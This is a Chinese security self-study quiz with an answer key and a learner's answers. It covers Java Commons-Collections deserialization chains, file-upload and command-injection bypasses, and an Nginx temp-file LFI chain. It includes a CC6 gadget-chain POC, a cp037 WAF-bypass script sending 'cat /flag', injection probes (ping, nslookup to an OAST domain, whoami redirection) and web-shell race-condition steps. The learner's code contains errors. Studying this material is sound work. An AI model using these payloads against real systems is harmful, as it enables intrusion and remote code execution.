# 本周学习检测题（第 2 周）

> **本周核心**：Java反序列化 Chains · 命令注入 · 文件上传 · 编码绕过  
> **本周内容**：CC1/3/5/6/7链、Gadget库对比、Hdphp(Nginx临时文件LFI)、EzPing(编码差异命令注入)、命令注入、文件上传

<link rel="stylesheet" href="/asserts/css/test-style.css">
<script src="/asserts/js/test-script.js" defer></script>

---

## 📊 自测打分表

<div class="test-card">
  <div class="test-score"><span>📊 基础分</span><span id="baseScore">87</span><span> / 90</span></div>
  <div class="test-score"><span>⭐ 含附加题</span><span id="totalScore">93</span><span> / 100</span></div>
  <div class="test-score"><span>🏆 评级</span><span id="rating">—</span></div>
  <button class="test-reset" id="resetBtn">🔄 重置</button>
</div>

| 题号 | 题型 | 分值 | 得分 |
|:----:|:----:|:----:|:----:|
| 一.1 | 选择题 | 4 | <input class="test-input" data-max="4" value="4"> |
| 一.2 | 选择题 | 4 | <input class="test-input" data-max="4" value="4"> |
| 一.3 | 选择题 | 4 | <input class="test-input" data-max="4" value="4"> |
| 一.4 | 选择题 | 4 | <input class="test-input" data-max="4" value="4"> |
| 一.5 | 选择题 | 4 | <input class="test-input" data-max="4" value="4"> |
| 二.1 | 简答题 | 8 | <input class="test-input" data-max="8" value="8"> |
| 二.2 | 简答题 | 8 | <input class="test-input" data-max="8" value="8"> |
| 二.3 | 简答题 | 8 | <input class="test-input" data-max="8" value="8"> |
| 二.4 | 简答题 | 8 | <input class="test-input" data-max="8" value="8"> |
| 二.5 | 简答题 | 8 | <input class="test-input" data-max="8" value="8"> |
| 三.1 | 代码构造题 | 15 | <input class="test-input" data-max="15" value="15"> |
| 三.2 | 代码构造题 | 15 | <input class="test-input" data-max="15" value="15"> |
| 四 | 综合分析题 | 10 | <input class="test-input" data-max="10" value="7"> |
| 五 | 附加题 | 10 | <input class="test-input" data-max="10" data-bonus="true" value="5"> |

<div class="test-summary">
  <h4>📝 自测简记</h4>
  <textarea id="testNotes" rows="2" placeholder="记录丢分题号、需要复盘的知识点【四.1,四.4,五.2】">四.1,四.4,五.2</textarea>
</div>

---

## 一、选择题（每题4分，共20分）

### 第1题

关于 CC6 链和 CC1 链的区别，下列说法正确的是？

A. CC6 链使用了动态代理，CC1 没有  
B. CC6 链依赖 JDK 版本 ≤ 8u71，CC1 无此限制  
C. CC6 链通过 HashMap.readObject() → TiedMapEntry.hashCode() 触发，不依赖动态代理  
D. CC6 链不能执行任意命令，只能做探测  

<details>
  <summary><strong>📖 查看答案</strong></summary>


**答案：C**

**解析：**


- A ❌ 相反，CC1 用了动态代理（AnnotationInvocationHandler + 代理），CC6 没有。
- B ❌ CC1 有 JDK ≤ 8u71 限制，CC6 无此限制。
- C ✅ 正确。CC6 通过 HashMap 反序列化时计算 key.hashCode() 触发 TiedMapEntry.hashCode() → LazyMap.get()。
- D ❌ CC6 同样通过 ChainedTransformer + InvokerTransformer 执行任意命令。


</details>

---

### 第2题

在文件上传漏洞中，关于条件竞争（Race Condition）的利用，下列说法正确的是？

A. 条件竞争只能用于绕过文件类型检查，不能用于绕过内容验证  
B. 条件竞争利用的是“文件上传后 → 验证 → 删除”之间的时间窗口  
C. 条件竞争只能通过多线程上传同一个文件来实现  
D. 使用随机化临时文件名可以完全防御条件竞争攻击  

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：B**

**解析：**

- A ❌ 条件竞争同样可用于绕过内容验证（如杀毒软件扫描前执行）。
- B ✅ 核心原理：在验证通过前文件已存在于服务器上，攻击者在删除前访问并执行。
- C ❌ 通常是一个线程不断上传恶意文件，另一个线程不断访问该文件。
- D ❌ 如果文件名可预测（如 uniqid() 弱随机）或可爆破，仍有风险。

</details>

---

### 第3题

在 Hdphp 题目中，使用 `/proc/self/fd/a/../3` 代替 `/proc/self/fd/3` 的原因是？

A. 前者路径更短，更容易被 include  
B. 前者可以绕过 realpath() 对 (deleted) 后缀的检查  
C. 前者可以绕过正则表达式中的 `(proc|dev|bin|usr|var).{15,}` 限制  
D. 前者可以触发 Nginx 重新生成临时文件  

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：B**

**解析：**

- A ❌ 路径更长，不是优势。
- B ✅ 核心：PHP 的 realpath() 会解析出 `/proc/self/fd/3` 指向的 (deleted) 路径并报错；`/proc/self/fd/a/../3` 让 PHP 无法识别为软链接，直接交给内核解析，内核会正确打开文件描述符。
- C ❌ 正则限制的是路径中的 `/proc` 等关键词，本题正则限制的是后续长度 ≥15 个字符，`/proc/self/fd/` 路径本身不触发。
- D ❌ 不会触发重新生成。

</details>

---

### 第4题

关于 CC3 链与 CC1/5/6/7 链的本质区别，下列说法正确的是？

A. CC3 链使用了 TemplatesImpl 加载恶意字节码，不依赖 Runtime.exec()  
B. CC3 链只能在高版本 JDK 上使用  
C. CC3 链的命令执行方式仍然是 InvokerTransformer 调用 Runtime.exec()  
D. CC3 链不需要 ChainedTransformer  

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：A**

**解析：**

- A ✅ CC3 通过 TrAXFilter → TemplatesImpl.newTransformer() 加载恶意字节码，绕过了对 Runtime.exec() 的直接依赖。
- B ❌ CC3 反而依赖 JDK 中的 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，JDK 8 默认存在。
- C ❌ 不是，CC3 最终执行的是字节码中的静态代码块或构造函数。
- D ❌ CC3 仍然使用 ChainedTransformer 串联 ConstantTransformer + InstantiateTransformer。

</details>

---

### 第5题

在 EzPing 题目中，绕过 WAF 的核心技术是？

A. 使用 %0a 换行符绕过命令分隔符过滤  
B. 使用 & 和 | 的组合绕过黑名单  
C. 利用 Content-Type: application/json; charset=cp037 让 WAF 和业务代码使用不同编码解析同一份数据  
D. 使用 base64 编码绕过关键词检测  

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：C**

**解析：**

- A ❌ 换行符绕过是常见手法，但不是本题核心。
- B ❌ 命令分隔符已被过滤。
- C ✅ WAF 检查原始字节流（request.get_data()），业务代码按 charset 参数解码。攻击者用 cp037 编码发送 `cat /flag`，WAF 看不到 `cat` 的 ASCII 字节，业务代码解码后正常执行。
- D ❌ base64 绕过需要管道配合 `| base64 -d | bash`，但 `|` 和 `bash` 都被过滤。

</details>

---

## 二、简答题（每题8分，共40分）

### 第1题

请分别说明 CC1、CC5、CC6、CC7 的入口点和触发方法（如何从 readObject 走到 LazyMap.get()）。

<details>
  <summary><strong>📖 查看答案</strong></summary>

| 链 | 入口点 | 触发路径 |
|----|--------|----------|
| CC1 | AnnotationInvocationHandler.readObject() | memberValues.entrySet() → 动态代理 → invoke() → memberValues.get() → LazyMap.get() |
| CC5 | BadAttributeValueExpException.readObject() | valObj.toString() → TiedMapEntry.toString() → getValue() → LazyMap.get() |
| CC6 | HashMap.readObject() | putForCreate() → hash(key) → key.hashCode() → TiedMapEntry.hashCode() → getValue() → LazyMap.get() |
| CC7 | Hashtable.readObject() | reconstitutionPut() → equals() → AbstractMap.equals() → LazyMap.get() |

</details>

---

### 第2题

在文件上传漏洞中，列出至少 3 种绕过黑名单扩展名的方法，并分别说明原理。

<details>
  <summary><strong>📖 查看答案</strong></summary>

| 绕过方法 | 原理 | 示例 |
|----------|------|------|
| 大小写绕过 | 验证区分大小写，但服务器不区分 | `.pHp` |
| 双扩展名 | 验证只看最后一个扩展名，服务器从左匹配 | `.php.jpg` |
| 末尾添加字符 | Windows 自动去除末尾的 `.` 或空格 | `.php.` |
| URL 编码/双重编码 | 验证不解码，服务器解码 | `%2Ephp` / `%252Ephp` |
| 空字节截断 | C 语言字符串终止符，PHP 5.3 之前有效 | `.php%00.jpg` |
| 覆盖 .htaccess | 让任意扩展名被当作 PHP 执行 | `.htaccess` + `shell.jpg` |

> 答出任意 3 种即可。

</details>

---

### 第3题

简述 CC3 链与 CC1 链在命令执行方式上的核心区别。为什么 CC3 在某些场景下更优？

<details>
  <summary><strong>📖 查看答案</strong></summary>

**核心区别：**

- **CC1**：通过 InvokerTransformer 反射调用 Runtime.exec() 执行系统命令。
- **CC3**：通过 InstantiateTransformer 实例化 TrAXFilter，触发 TemplatesImpl.newTransformer() 加载恶意字节码，在字节码的静态代码块或构造函数中执行命令。

**CC3 优势：**

- 不依赖 Runtime.exec()，可绕过对 Runtime 类的限制。
- 字节码中可以执行任意 Java 代码，比 exec() 更灵活（如写文件、反弹 Shell）。
- 在某些禁用 Runtime.exec() 但允许类加载的环境中仍然可用。

</details>

---

### 第4题

在命令注入中，什么是盲注？请写出两种检测盲命令注入的方法，并分别举例。

<details>
  <summary><strong>📖 查看答案</strong></summary>

**盲命令注入**：应用程序执行了系统命令，但命令的输出不会返回到 HTTP 响应中。

**两种检测方法：**

| 方法 | 原理 | 示例 |
|------|------|------|
| 时间延迟 | 通过命令执行耗时判断是否执行 | `|| ping -c 10 127.0.0.1` \|\| |
| 带外（OAST） | 触发 DNS/HTTP 请求到攻击者服务器 | `|| nslookup xxx.oastify.com` \|\| |
| 输出重定向 | 将命令输出重定向到 Web 可访问目录 | `|| whoami > /var/www/static/whoami.txt` \|\| |

> 答出任意 2 种即可。

</details>

---

### 第5题

在 Hdphp 题目中，Nginx 的临时文件机制是如何被利用的？请写出完整的利用链路。

<details>
  <summary><strong>📖 查看答案</strong></summary>

**Nginx 临时文件机制：**

- 当 POST 请求体大小超过 `client_body_buffer_size`（默认 8KB/16KB）时，Nginx 将请求体写入磁盘临时文件。
- 临时文件路径模式：`/var/lib/nginx/temp/client_body/xxxxxx`
- 临时文件在整个请求处理期间存在，请求结束后被删除。

**利用链路：**
攻击者构造一个大 POST 请求（> 16KB），请求体中包含恶意 PHP 代码
↓

Nginx 将请求体写入临时文件（如 /var/lib/nginx/.../0000000001）
↓

Nginx 通过 FastCGI 将请求转发给 PHP-FPM（请求还在处理中，临时文件未删除）
↓

攻击者通过 LFI 包含 /proc/self/fd/a/../3（指向临时文件的文件描述符）
↓

PHP 执行临时文件中的恶意代码 → RCE

text

**关键绕过：**

使用 `/proc/self/fd/a/../3` 而非 `/proc/self/fd/3` 绕过 realpath() 对 `(deleted)` 后缀的检查。

</details>

---

## 三、代码/构造题（每题15分，共30分）

### 第1题（命令注入 + 编码绕过）

阅读以下代码，回答问题：

```python
# WAF 中间件
def waf_middleware():
    raw_data = request.get_data()
    blacklist = [b'cat', b'ls', b';', b'|', b'&']
    for word in blacklist:
        if word in raw_data:
            return jsonify({'error': 'No hacker!'}), 403

# 业务代码
@app.route('/ping', methods=['POST'])
def ping():
    target = request.json.get('target')
    result = subprocess.run(f"ping -c 1 {target}", shell=True, capture_output=True)
    return result.stdout
```
问题：

WAF 检查的是原始字节流还是解码后的字符串？为什么？

已知业务代码通过 request.json 获取数据，默认使用 UTF-8 解码。请设计一种绕过 WAF 的方法，执行 cat /flag 命令。

写出完整的 Python 攻击脚本（关键部分即可）。

<details> <summary><strong>📖 查看答案</strong></summary>
1. WAF 检查的是原始字节流

request.get_data() 返回 bytes 类型，不进行任何字符解码，直接检查传输层字节。

2. 绕过方法

利用编码差异：选择一个 WAF 黑名单字节不匹配、但业务代码能正确解码为攻击命令的编码。

例如使用 cp037（EBCDIC）编码发送 cat /flag：

WAF 看到的字节：\x83\x81\xa3\x40\x2f\x86\x81\x87（不包含 cat 的 ASCII 字节）

业务代码解码后：cat /flag

3. 攻击脚本

```python
import requests
import json

url = "http://target.com/ping"
encoding = "cp037"

# 恶意 payload
payload = {"target": "127.0.0.1; cat /flag"}
json_str = json.dumps(payload)

# 使用 cp037 编码发送
encoded_data = json_str.encode(encoding)

headers = {
    "Content-Type": f"application/json; charset={encoding}"
}

response = requests.post(url, data=encoded_data, headers=headers)
print(response.text)
```
</details>

### 第2题（CC6 链构造）
请手动构造一个 CC6 链的 POC 核心部分（不需要完整导入语句），要求：

写出 Transformer[] 数组的构造（用于执行 calc）

写出如何包装到 LazyMap 和 TiedMapEntry

写出如何触发反序列化执行

<details> <summary><strong>📖 查看答案</strong></summary>
```java
// 1. 构造 Transformer 链
ConstantTransformer ct = new ConstantTransformer(Runtime.class);
InvokerTransformer it1 = new InvokerTransformer("getMethod",
    new Class[]{String.class, Class[].class},
    new Object[]{"getRuntime", new Class[0]});
InvokerTransformer it2 = new InvokerTransformer("invoke",
    new Class[]{Object.class, Object[].class},
    new Object[]{null, new Object[0]});
InvokerTransformer it3 = new InvokerTransformer("exec",
    new Class[]{String.class},
    new Object[]{"calc"});

Transformer[] transformers = new Transformer[]{ct, it1, it2, it3};
ChainedTransformer chain = new ChainedTransformer(transformers);

// 2. 包装到 LazyMap（先用无害 factory）
HashMap innerMap = new HashMap();
LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, new ConstantTransformer(1));

// 3. 包装到 TiedMapEntry
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");

// 4. 放入 HashMap
HashMap hashMap = new HashMap();
hashMap.put(entry, "value");

// 5. 移除触发过的 key
lazyMap.remove("key");

// 6. 反射替换 factory 为恶意 chain
Field f = lazyMap.getClass().getDeclaredField("factory");
f.setAccessible(true);
f.set(lazyMap, chain);

// 7. 序列化 hashMap → 反序列化时触发
```
触发链路：
```text
HashMap.readObject() → hash(key) → key.hashCode() 
→ TiedMapEntry.hashCode() → getValue() 
→ LazyMap.get() → factory.transform() 
→ ChainedTransformer → Runtime.exec("calc")
```
</details>

## 四、综合分析题（10分）
场景： 你在代码审计中发现一个 Java Web 应用使用了以下依赖：

commons-collections 3.2.1

spring-web 5.x

jackson-databind 2.9.x

该应用存在一个反序列化入口：POST /api/data，接收 Content-Type: application/json 的请求体，使用 Jackson 反序列化，且开启了 enableDefaultTyping()。

同时，应用还有一个文件上传功能，上传目录为 /uploads/，但该目录禁止执行脚本。

问题：

针对 Jackson 反序列化入口，你会优先尝试使用哪条 Gadget 链？为什么？（2分）

如果 Jackson 链失败，你发现应用中还存在 Java 原生序列化入口（/api/export，接收序列化字节流），你会优先选择 CC1、CC5、CC6 中的哪一个？为什么？（3分）

文件上传功能中，如何通过条件竞争绕过内容验证？请描述攻击步骤。（3分）

如果将文件上传目录改为 /uploads/ + 随机字符串 + /，是否可以完全防御条件竞争？为什么？（2分）

<details> <summary><strong>📖 查看答案</strong></summary>

1. Jackson 反序列化入口优先尝试的 Gadget 链

优先尝试：com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 链

原因：

Jackson 开启 enableDefaultTyping() 后，可以在 JSON 中指定 @class，反序列化任意类。

TemplatesImpl 是 JDK 内置类，不依赖第三方库，利用 _bytecodes 字段加载恶意字节码。

相比 CC 链，Jackson 的 TemplatesImpl 链更加通用且稳定。


2. 原生序列化入口优先选择

优先选择：CC6

原因：

CC1 有 JDK ≤ 8u71 限制，CC5/CC6/CC7 无此限制。

CC6 使用 HashMap 作为入口，HashMap 在 Java 应用中几乎无处不在，通用性最强。

CC6 不依赖动态代理，调用链稳定。

CC5 依赖 BadAttributeValueExpException（JMX 组件），不是所有环境都存在。

CC7 依赖 Hashtable，不如 HashMap 常见。


3. 条件竞争绕过内容验证

攻击步骤：

```text
1. 准备恶意 PHP 脚本（如 shell.php）
         ↓
2. 编写多线程脚本：
   - 线程 A：不断上传 shell.php（文件内容简单，方便快速上传）
   - 线程 B：不断访问 /uploads/shell.php
         ↓
3. 服务器接收上传文件 → 保存到临时目录/直接保存到目标目录
         ↓
4. 服务器执行内容验证（如扫描病毒、检查文件头）
         ↓
5. 在验证完成、删除恶意文件之前，线程 B 成功访问到文件
         ↓
6. 文件被服务器执行 → 获得 Web Shell
关键点： 利用“文件保存 → 验证 → 删除”之间的时间窗口。
```
4. 随机目录是否可以完全防御？

不能完全防御。

原因：

如果目录名使用弱随机算法（如 uniqid() 基于时间戳），攻击者可以爆破。

攻击者可以延长文件处理时间（如上传大文件，填充垃圾字节），扩大爆破窗口。

如果信息泄露（如目录名出现在错误信息、日志、API 响应中），攻击者可直接获取。

正确做法： 使用强随机数（如 UUID.randomUUID()）+ 验证前存于非 Web 可访问目录 + 验证通过后随机化文件名。

</details>

## 五、附加题（挑战，10分）
**题目**：

在 CC3 链中，使用了 InstantiateTransformer 来实例化 TrAXFilter，传入的参数是 TemplatesImpl 对象。请你解释：

为什么实例化 TrAXFilter 会触发 TemplatesImpl.newTransformer()？

如果目标环境的 TemplatesImpl 类被删除或不可用，还有哪些替代的“入口类”可以配合 InstantiateTransformer 或类似机制实现字节码加载？

<details> <summary><strong>📖 查看答案</strong></summary>

1. 为什么实例化 TrAXFilter 会触发 TemplatesImpl.newTransformer()？

TrAXFilter 的构造方法如下：

```java
public TrAXFilter(Templates templates) throws TransformerConfigurationException {
    this(templates.newTransformer());
}
```
构造方法接收一个 Templates 对象，并立即调用其 newTransformer() 方法。

TemplatesImpl 实现了 Templates 接口。

因此，InstantiateTransformer 实例化 TrAXFilter 时传入 TemplatesImpl 对象，会触发 TemplatesImpl.newTransformer()，进而加载 _bytecodes 中的恶意字节码。


2. 替代的入口类

如果 TemplatesImpl 不可用，可以考虑以下替代：

类	原理
com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl	同样涉及 Templates 操作
com.sun.org.apache.bcel.internal.util.ClassLoader	BCEL 类加载器，可加载恶意字节码
groovy.lang.GroovyShell	加载 Groovy 脚本执行命令（需 Groovy 依赖）
javax.script.ScriptEngineManager	加载 JavaScript 等脚本引擎执行代码
org.springframework.expression.spel.standard.SpelExpression	SpEL 表达式执行（需 Spring 依赖）
实际利用中，需要根据目标环境中的类来选择替代链。

</details>

## my answer
### 选择题
1. c
2. B
3. B
4. A
5. C
### 简答题
1. CC1：
   ```java
   AnnotationInvocationHandler.readObject()
    |
    proxyMap.entrySet()
      |
      InvocationHandler.invoke()
        |
        LazyMap.get()
   ``` 
   CC5：
   ```java
   BadAttributeValueExpException.readObject()
    |
    val.toString()
    |
    TiedMapEntry.toString()
    |
    TiedMapEntry.getValue()
      |
      LazyMap.get()
   ```
   CC6：
   ```java
   HashMap.readObject()
   |
   HashMap.putForCreate()
    |
    hash(key)
    |
    TiedMapEntry.hashCode()
    |
    TiedMapEntry.getValue()
      |
      LazyMap.get()
   ```
   CC7：
   ```java
   HashTable.readObject()
   |
   HashTable.reconstitutionPut()    //确保LazyMap1和LazyMap2的key不相等但hashCode相等【("yy",1)("zZ",1)】
    |
    LazyMap1.equals(LazyMap2)
    |
    AbstractDecorationMap.equals()
      |
      HashMap.equals(LazyMap2)
      |
      AbstractMap.equals(LazyMap2)
        |
        LazyMap2.get()
   ```
2. 方法一：大小写、双写绕过【利用还没来只检查小写后缀或只匹配一次】
   方法二：`%00`截断`;` 截断【利用底层实现的语言特性，%00url解码后是空字节，c语言复制时遇到空字节会认为后面没有内容了会自动忽略后面的内容，IIS只解析`;`之间的内容，但防火墙会看到全部的后缀，因此二者出现了偏差】
   方法三：多后缀名【WAF可能只从后向前匹配一次后缀名，Apache会从左向右匹配后缀名知道找到第一个它可以识别的】
   方法四：.htaccess配置文件上传【当中间件允许自己的配置文件被覆盖并且.htaccess不在黑名单中时，可以通过上传该配置文件让中间件将指定后缀名的文件交给php解析器解析执行】
   方法五：不同后缀名绕过【php3,php5,php7,phtml,pht等】
   方法六：末尾加上`.` `空格`【Windows系统报错文件时会自动清除文件名末尾的.和空格，但防火墙不会】
3. CC1是通过InvokerTransformer执行调用任意方法最终执行Runtime.exec()；CC3是通过InstantiateTransformer调用任意类的有参构造方法从而触发特定类TrAXFilter实例化触发TemplatesImpl.newTransformer()从而导致加载恶意字节码执行命令CC1使用的类和方法可能会在黑名单中，CC3使用的类一般不会被禁用且不依赖 Runtime.exec()，可绕过对 Runtime 类的限制。 字节码中可以执行任意 Java 代码，比 exec() 更灵活（如写文件、反弹 Shell）
4. 时间延时检测`;ping -c 10 127.0.0.1;`
   DNS带外检测`; nslookup 攻击者域名;`
5. Nginx当请求体大小超过一定数值【由配置决定】时会生成临时文件将请求体中的内容临时保存在磁盘上，只有当请求处理完成才会清除文件，这会导致攻击者不需要利用条件竞争去与usleep()抢时间差
   ```
    构造恶意php代码开头的超大请求体
    |
    猜测临时文件的fd号
    |
    在该请求中对生成的临时文件进行LFI
    |
    利用路径规范化绕过realPath()的干扰
    |
    实现RCE
   ```
### 代码构造题
1. 检查原始字节流因为request.get_data()返回的是原始字节流【bytes类型】表示形式
   POC
   ```python
    import requests
    import json

    url="target"
    encoding="cp037"
    headers={"Content-Type":f"application/json;charset={encoding}"}
    json_data={"target":"127.0.0.1;cat /flag"}
    json_str=json.dumps(json_data)
    data=json_str.encode(encoding)
    response=requests.post(url=url,headers=headers,data=data)
    print(response.text)
   ``` 
2. POC
   ```java
    public class CC6demo{
      public static void main() throws Exception{
        ConstantTransformer ct=new ConstantTransformer(Runtime.class);
        InvokerTransformer it1=new InvokerTransformer("getMethod",
        new Class[]{Sting.class,Object[].class},
        new Object[]{"getRuntime",new Object[0]});
        InvokerTransformer it2=new InvokerTransformer("invoke",
        new Class[]{Object.class,Class[].class},
          new Object[]{null,new Class[0]}
        );
        InvokerTransformer it3=new InvokerTransformer("exec",
          new Class[]{String.class},
          new Object[]{"calc"}
        );
        ChainedTransformer chain=new ChainedTransformer(new Transformer[]{ct,it1,it2,it3});
        

        HashMap map1=new HashMap();
        Map lazyMap=LazyMap.decorate(map,new ConstantTransformer(1));
        TiedMapEntry t=new TiedMapEntry(lazyMap,"key");
        HashMap map2=new HashMap();
        map2.put(t,"value");

        lazyMap.remove("key");

        Field f=lazyMap.getClass().getDeclaredField("factory");
        f.setAccessible(true);
        f.set(lazyMap,chain);
      }
    }
   ```
   ```
   HashMap.readObject() → hash(key) → key.hashCode() 
    → TiedMapEntry.hashCode() → getValue() 
    → LazyMap.get() → factory.transform() 
    → ChainedTransformer → Runtime.exec("calc")
   ``` 
### 综合分析题
1. com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 链，Jackson开启enableDefaultTyping() 后，可以在通过@class指定反序列化任意类，TemplatesImpl可以加载恶意字节码执行命令，不依赖jdk版本，是jdk内置类不依赖第三方库。利用 _bytecodes 字段加载恶意字节码。 相比 CC 链，Jackson 的 TemplatesImpl 链更加通用且稳定而且稳定
2. CC6 无jdk限制，入口为HashMap是基础类，CC1有jdk现在且依赖动态代理，CC5的BadAttributeValueExpException是JMX组件不常见，CC7的HashTable也不让HashMap常见
3. 多线程并发上传文件同时多线程并发访问文件
4. 不能完全防御，如果采用基于时间戳的算法可以爆破，攻击者还可以通过上传大文件延长文件处理时间扩大爆破窗口。 如果信息泄露（如目录名出现在错误信息、日志、API 响应中），攻击者可直接获取。 
   1. 正确做法： 使用强随机数（如 UUID.randomUUID()）+ 验证前存于非 Web 可访问目录 + 验证通过后随机化文件名。 
### 附加题 
1. TemplatesImpl.newTransformer()方法是public的，TrAXFilter的构造方法中调用了newTransformer()方法，且TrAXFilter的参数是Template接口类型，TemplatesImpl实现了该接口，所以只需要调用TrAXFilter构造方法时传入TemplatesImpl对象即可触发TemplatesImpl.newTransformer()
2. 【 2. 替代的入口类 如果 TemplatesImpl 不可用，可以考虑以下替代： 类 原理 com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl 同样涉及 Templates 操作 com.sun.org.apache.bcel.internal.util.ClassLoader BCEL 类加载器，可加载恶意字节码 groovy.lang.GroovyShell 加载 Groovy 脚本执行命令（需 Groovy 依赖） javax.script.ScriptEngineManager 加载 JavaScript 等脚本引擎执行代码 org.springframework.expression.spel.standard.SpelExpression SpEL 表达式执行（需 Spring 依赖）实际利用中，需要根据目标环境中的类来选择替代链。 】